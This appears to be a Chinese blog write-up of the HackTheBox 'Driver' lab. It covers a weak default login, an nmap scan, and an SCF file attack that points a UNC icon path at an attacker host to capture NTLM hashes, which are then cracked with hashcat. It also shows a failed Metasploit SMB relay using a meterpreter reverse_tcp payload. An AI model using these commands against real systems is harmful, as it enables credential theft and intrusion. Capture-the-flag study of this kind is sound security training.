---
title: HackTheBox-Dirver
typora-root-url: ..
date: 2021-12-07 21:18:04
tags:
 - HTB
 - SMB
---



## 初步尝试

访问 10.10.11.106 ，弹出 basic 认证界面，输入 admin:admin 可直接弱密码进入

![image-20211207212043408](/assets/image-20211207212043408.png)

进入后只有一个页面固件上传页面是可用的，但不知道文件上传到哪了

使用nmap进行扫描，结果如下：

```bash
nmap  -A -sV -sC -p- 10.10.11.106
```

![image-20211207212236347](/assets/image-20211207212236347.png)

可以发现是开了  135  445  5985  端口

## 学习知识

通过 作弊 ，知道了SCF 文件攻击 这个术语

> SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，这并不是什么新鲜事。

结合上面发现的文件上传点，我们知道会有人定时去查看该文件夹，也就是提示了可以触发SCF漏洞，这里有三种利用方式。



### 通过NTLM捕获SMB攻击

一个 SCF 文件可以用来访问一个特定的 UNC 路径，允许渗透测试人员构建攻击。下面的代码可以被放置在一个文本文件，然后需要被植入到网络共享。



```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

然后通过 responder 命令接收来自客户端的挑战

```bash
responder -wrf -I eth0
```

![image-20211207220539265](/assets/image-20211207220539265.png)

或者使用 msf 的 `auxiliary/server/capture/smb` 模块接收(未成功)

#### 爆破 密码(hashcat)

```bash
hashcat -m 5600 hash.txt rockyou.txt --self-test-disable
```

![image-20211207222632895](/assets/image-20211207222632895.png)

#### 直接获取shell

利用msf 框架实现攻击

```bash
use exploit/windows/smb/smb_relay
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.16.7
set smbhost 192.168.0.100
set srvport 8080
exploit
```

失败，估计是没权限



### 上传payload获取shell

本方法的主要优点是它不需要与用户有任何交互，并自动强制用户连接到共享，在这个过程中不存在NTLMv2哈希的协商过程。因此，也可以将此技术与SMB中继相结合，SMB中继将提供有效载荷，可以从访问该共享的每个用户检索Meterpreter Shell。



## 参考资料

- https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
